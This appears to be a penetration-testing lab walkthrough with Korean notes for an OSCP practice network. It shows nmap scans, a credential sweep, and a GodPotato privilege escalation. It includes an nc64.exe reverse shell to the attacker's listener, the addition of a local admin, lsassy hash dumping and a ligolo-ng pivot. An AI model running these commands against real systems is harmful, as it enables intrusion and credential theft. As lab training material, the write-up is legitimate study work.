---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/ad/dcsync
  - tech/win/potato
  - tech/win/seimpersonate
  - tech/web/lfi-rfi
  - tech/db/mysql
  - tech/svc/smb
  - tech/svc/ftp
  - tech/exec/winrm
  - tech/pivot/ligolo
  - tech/enum/searchsploit
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.144.141
domain: oscp.exam
ports: [21, 22, 53, 80, 81, 88, 135, 139, 443, 445, 464, 636, 1433, 1978, 3000, 3001, 3003, 3268, 3269, 3306, 3307, 3389, 5432, 5985, 5986, 9389, 47001]
services: [cgms, domain, ftp, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ms-sql-s, ms-wbt-server, msrpc, mysql, nessus, netbios-ssn, postgresql, ppp, ssh, ssl/http, ssl/wsmans, unisql]
cves: [CVE-2020-13151]
status: solved
tech_count: 11
---

### Nmap
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nnmap 192.168.144.141
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-12 14:11 +0900
Nmap scan report for 192.168.144.141
Host is up (0.085s latency).
Not shown: 65515 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
80/tcp    open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Home
|_http-generator: Nicepage 4.8.2, nicepage.com
81/tcp    open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Attendance and Payroll System
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MySQL (unauthorized)
3307/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/wsmans?
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2026-08-11T12:07:57
|_Not valid after:  2036-08-09T12:07:57
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: 2026-08-12T12:14:51+00:00; +7h00m00s from scanner time.
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=8/12%OT=22%CT=1%CU=33323%PV=Y%DS=4%DC=T%G=Y%TM=6A7C014
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=I%CI=I%TS=U)SEQ(SP=1
OS:03%GCD=2%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%TS=U)
OS:SEQ(SP=107%GCD=1%ISR=10C%TI=I%CI=I%TS=U)SEQ(SP=FD%GCD=1%ISR=105%TI=I%CI=
OS:I%TS=U)OPS(O1=M540NW8NNS%O2=M540NW8NNS%O3=M540NW8%O4=M540NW8NNS%O5=M540N
OS:W8NNS%O6=M540NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M540NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-08-12T12:14:38
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   83.39 ms 192.168.45.1
2   83.33 ms 192.168.45.254
3   84.32 ms 192.168.251.1
4   85.45 ms 192.168.144.141

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.75 seconds

```

```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nnmap 192.168.144.143
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-12 14:15 +0900
Nmap scan report for 192.168.144.143
Host is up (0.084s latency).
Not shown: 65525 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 14:cd:7a:f6:b1:ff:bc:01:e6:1c:f8:70:02:4f:5d:c3 (RSA)
|   256 e7:39:d3:f1:ac:9c:c4:6f:76:f8:68:3b:f9:4e:c4:62 (ECDSA)
|_  256 17:9b:b7:7b:1f:5c:71:fb:f4:1a:e7:ca:22:77:e6:12 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Test Page for the Nginx HTTP Server on Fedora
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp  open  http       Apache httpd 2.4.41
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql      MySQL (unauthorized)
5432/tcp open  postgresql PostgreSQL DB 12.9 - 12.13
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=aero
| Subject Alternative Name: DNS:aero
| Not valid before: 2021-05-10T22:20:48
|_Not valid after:  2031-05-08T22:20:48
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3003-TCP:V=7.98%I=7%D=8/12%Time=6A7C01A7%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSPReq
SF:uest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServerCoo
SF:kie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDString,
SF:1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 - 3.13 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Android 10 - 12 (Linux 4.14 - 4.19) (91%), Linux 2.6.32 - 3.10 (91%), Linux 2.6.32 - 3.5 (86%), Crestron XPanel control system (86%), Android 9 - 10 (Linux 4.9 - 4.14) (85%), Linux 3.10 - 4.11 (85%), Linux 4.15 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: 192.168.131.143; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   83.11 ms 192.168.45.1
2   83.01 ms 192.168.45.254
3   83.63 ms 192.168.251.1
4   83.90 ms 192.168.144.143

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.04 seconds
```

```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nnmap 192.168.144.144
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-12 14:29 +0900
Nmap scan report for 192.168.144.144
Host is up (0.084s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 72:55:a5:65:ad:8d:66:b0:7d:a5:6e:ee:10:c5:9b:73 (ECDSA)
|_  256 b7:e3:e2:bc:4d:d5:31:63:6d:bb:3c:4b:34:c5:12:d0 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Home
|_http-generator: Nicepage 4.21.12, nicepage.com
| http-git:
|   192.168.144.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update
|     Remotes:
|_      https://ghp_REDACTED_PAT@github.com/PWK-Challenge-Lab/dev.git
|_http-server-header: Apache/2.4.52 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=8/12%OT=21%CT=1%CU=40267%PV=Y%DS=4%DC=T%G=Y%TM=6A7C04F
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GC
OS:D=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M540ST11NW7%O2=M540ST11NW7%O3=M54
OS:0NNT11NW7%O4=M540ST11NW7%O5=M540ST11NW7%O6=M540ST11)WIN(W1=FEF4%W2=FEF4%
OS:W3=FEF4%W4=FEF4%W5=FEF4%W6=FEF4)ECN(R=Y%DF=Y%T=40%W=FC00%O=M540NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40
OS:%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   83.60 ms 192.168.45.1
2   82.48 ms 192.168.45.254
3   83.66 ms 192.168.251.1
4   85.09 ms 192.168.144.144

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.70 seconds
```

```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nnmap 192.168.144.145
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-12 14:31 +0900
Nmap scan report for 192.168.144.145
Host is up (0.086s latency).
Not shown: 65526 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Samuel's Personal Site
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1978/tcp open  unisql?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|_    system windows 6.2
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2026-08-12T13:35:06+00:00
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2026-08-11T13:06:01
|_Not valid after:  2027-02-10T13:06:01
|_ssl-date: 2026-08-12T13:35:47+00:00; +8h00m00s from scanner time.
5986/tcp open  ssl/wsmans?
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: 2026-08-12T13:35:47+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2026-08-11T13:07:31
|_Not valid after:  2036-08-09T13:07:31
7680/tcp open  pando-pub?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1978-TCP:V=7.98%I=7%D=8/12%Time=6A7C056A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"system\x20win
SF:dows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.2\n\n")%r(H
SF:TTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest,14,"system
SF:\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x206\.2\n\n"
SF:)%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")%r(DNSStatu
SF:sRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"system\x20wi
SF:ndows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x206\.2\n\n")
SF:%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%r(TLSSessio
SF:nReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"system\x20windo
SF:ws\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\n\n")%r(X11
SF:Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourRequest,14,"syste
SF:m\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows\x206\.2\n\
SF:n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LDAPBindReq,1
SF:4,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x20windows\x
SF:206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n")%r(Termina
SF:lServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system\x20windows
SF:\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n")%r(JavaRMI
SF:,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system\x20windows
SF:\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\n")%r(ms-sq
SF:l-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20windows\x20
SF:6\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (92%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (92%), Windows Server 2019 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-08-12T13:35:06
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   84.10 ms 192.168.45.1
2   84.07 ms 192.168.45.254
3   84.50 ms 192.168.251.1
4   86.04 ms 192.168.144.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 234.58 seconds
```



### nxc-sweep
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nxc-sweep 192.168.144.141 -u 'Eric.Wallows' -p 'EricLikesRunning800'
[*] Starting NXC sweep for 192.168.144.141 as Eric.Wallows ...

[+] Port 445 open. Checking smb ...
SMB         192.168.144.141 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.144.141 445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800
SMB         192.168.144.141 445    MS01             [*] Enumerated shares
SMB         192.168.144.141 445    MS01             Share           Permissions     Remark
SMB         192.168.144.141 445    MS01             -----           -----------     ------
SMB         192.168.144.141 445    MS01             ADMIN$                          Remote Admin
SMB         192.168.144.141 445    MS01             C$                              Default share
SMB         192.168.144.141 445    MS01             IPC$            READ            Remote IPC
SMB         192.168.144.141 445    MS01             setup           READ

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.144.141 5985   MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam)
WINRM       192.168.144.141 5985   MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 (Pwn3d!)

[-] Port 3389 closed/filtered. Skipping rdp

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.

┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nxc-sweep 192.168.144.142 -u 'Eric.Wallows' -p 'EricLikesRunning800'
[*] Starting NXC sweep for 192.168.144.142 as Eric.Wallows ...

[-] Port 445 closed/filtered. Skipping smb

[-] Port 5985 closed/filtered. Skipping winrm

[-] Port 3389 closed/filtered. Skipping rdp

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.

┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nxc-sweep 192.168.144.143 -u 'Eric.Wallows' -p 'EricLikesRunning800'
[*] Starting NXC sweep for 192.168.144.143 as Eric.Wallows ...

[-] Port 445 closed/filtered. Skipping smb

[-] Port 5985 closed/filtered. Skipping winrm

[-] Port 3389 closed/filtered. Skipping rdp

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.

┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nxc-sweep 192.168.144.144 -u 'Eric.Wallows' -p 'EricLikesRunning800'
[*] Starting NXC sweep for 192.168.144.144 as Eric.Wallows ...

[-] Port 445 closed/filtered. Skipping smb

[-] Port 5985 closed/filtered. Skipping winrm

[-] Port 3389 closed/filtered. Skipping rdp

[-] Port 1433 closed/filtered. Skipping mssql

[+] Port 21 open. Checking ftp ...
FTP         192.168.144.144 21     192.168.144.144  [-] Eric.Wallows:EricLikesRunning800 (Response:530 Login incorrect.)

[*] All active services checked.

┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nxc-sweep 192.168.144.145 -u 'Eric.Wallows' -p 'EricLikesRunning800'
[*] Starting NXC sweep for 192.168.144.145 as Eric.Wallows ...

[+] Port 445 open. Checking smb ...
SMB         192.168.144.145 445    OSCP             [*] Windows 10 / Server 2019 Build 19041 x64 (name:OSCP) (domain:oscp) (signing:False) (SMBv1:False)
SMB         192.168.144.145 445    OSCP             [-] oscp\Eric.Wallows:EricLikesRunning800 STATUS_LOGON_FAILURE

[-] Port 5985 closed/filtered. Skipping winrm

[+] Port 3389 open. Checking rdp ...
RDP         192.168.144.145 3389   OSCP             [*] Windows 10 or Windows Server 2016 Build 19041 (name:OSCP) (domain:oscp) (nla:True)
RDP         192.168.144.145 3389   OSCP             [-] oscp\Eric.Wallows:EricLikesRunning800 (STATUS_LOGON_FAILURE)

[-] Port 1433 closed/filtered. Skipping mssql

[+] Port 21 open. Checking ftp ...
FTP         192.168.144.145 21     192.168.144.145  [-] Eric.Wallows:EricLikesRunning800 (Response:530 User cannot log in.)

[*] All active services checked.
```

evil-winrm 통해 계정 권한 확인
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ evil-winrm -i 192.168.144.141 -u 'Eric.Wallows' -p 'EricLikesRunning800'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled
```

취약한 권한`SeImpersonate` 확인
![[Pasted image 20260812145055.png]]

Godpotato 업로드
```bash
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> upload GodPotato-NET4.exe

Info: Uploading /home/kali/PG/OSCP_A/GodPotato-NET4.exe to C:\Users\eric.wallows\Documents\GodPotato-NET4.exe

Data: 76456 bytes of 76456 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> dir


    Directory: C:\Users\eric.wallows\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/12/2026   6:09 AM          57344 GodPotato-NET4.exe
```

system 권한 확인
```bash
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140732797878272
[*] DispatchTable: 0x140732800329144
[*] UseProtseqFunction: 0x140732799661168
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\88696339-8c93-4d9b-b4eb-a87c5535862c\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00001402-05b0-ffff-6615-6e5ac17dfa37
[*] DCOM obj OXID: 0x8784b563838b854f
[*] DCOM obj OID: 0x4ed270c0d702eef0
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 896 Token:0x784  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5928
```

nc64.exe 업로드 후 리버스쉘 연결
```bash
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> upload nc64.exe

Info: Uploading /home/kali/PG/OSCP_A/nc64.exe to C:\Users\eric.wallows\Documents\nc64.exe

Data: 60360 bytes of 60360 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> .\GodPotato-NET4.exe -cmd "cmd /c c:\Users\eric.wallows\Documents\nc64.exe 192.168.45.223 4444 -e cmd"
[*] CombaseModule: 0x140732797878272
[*] DispatchTable: 0x140732800329144
[*] UseProtseqFunction: 0x140732799661168
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\ab67e940-c06f-4a18-8ba2-585b955dd49a\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005402-1bd8-ffff-ead6-8623bc8dd9f9
[*] DCOM obj OXID: 0x4054030a9a183826
[*] DCOM obj OID: 0xaa53f4b7e598cbdb
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 896 Token:0x784  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1420
```

리버스쉘 연결 성공
```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.223] from (UNKNOWN) [192.168.144.141] 53915
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter tap729d5bf7-cb:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::f57e:633c:7570:6d5a%3
   IPv4 Address. . . . . . . . . . . : 192.168.144.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.144.254

Ethernet adapter tap0fd8f88a-e7:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::b7df:813d:f856:39e8%16
   IPv4 Address. . . . . . . . . . . : 10.10.144.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```


eric.wallows admin 그룹 추가
```bash
c:\Users\Administrator\Desktop>net localgroup Administrators eric.wallows /add
net localgroup Administrators eric.wallows /add
The command completed successfully.
```

추가 여부 확인
```cmd
c:\Users\Administrator\Desktop>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Admin
Administrator
cloudbase-init
OSCP\Domain Admins
OSCP\eric.wallows
The command completed successfully.
```

Mary hash 획득
```bash
┌──(kali㉿kali)-[~/PG/OSCP_A]
└─$ nxc smb 192.168.144.141 -u 'Eric.wallows' -p 'EricLikesRunning800' -M lsassy
SMB         192.168.144.141 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.144.141 445    MS01             [+] oscp.exam\Eric.wallows:EricLikesRunning800 (Pwn3d!)
LSASSY      192.168.144.141 445    MS01             OSCP\celia.almeda e728ecbadfb02f51ce8eed753f3ff3fd
LSASSY      192.168.144.141 445    MS01             MS01\Mary.Williams 9a3121977ee93af56ebd0ef4f527a35e
```

pivot 진행
```bash
┌──(kali㉿kali)-[~/git/ligolo]
└─$ sudo ./proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
INFO[0000] Listening on 0.0.0.0:11601
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng » WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed.
INFO[0104] Agent joined.                                 id=fa163e8b5356 name="OSCP\\eric.wallows@MS01" remote="192.168.144.141:63270"
ligolo-ng » session
? Specify a session : 1 - OSCP\eric.wallows@MS01 - 192.168.144.141:63270 - fa163e8b5356
[Agent : OSCP\eric.wallows@MS01] » interface_create --name 10.10.162.0
INFO[0167] Creating a new 10.10.162.0 interface...
INFO[0167] Interface created!
[Agent : OSCP\eric.wallows@MS01] » interface_delete --name 10.10.162.0
? Remove all interface routes and settings from config? Yes
INFO[0194] Interface removed.
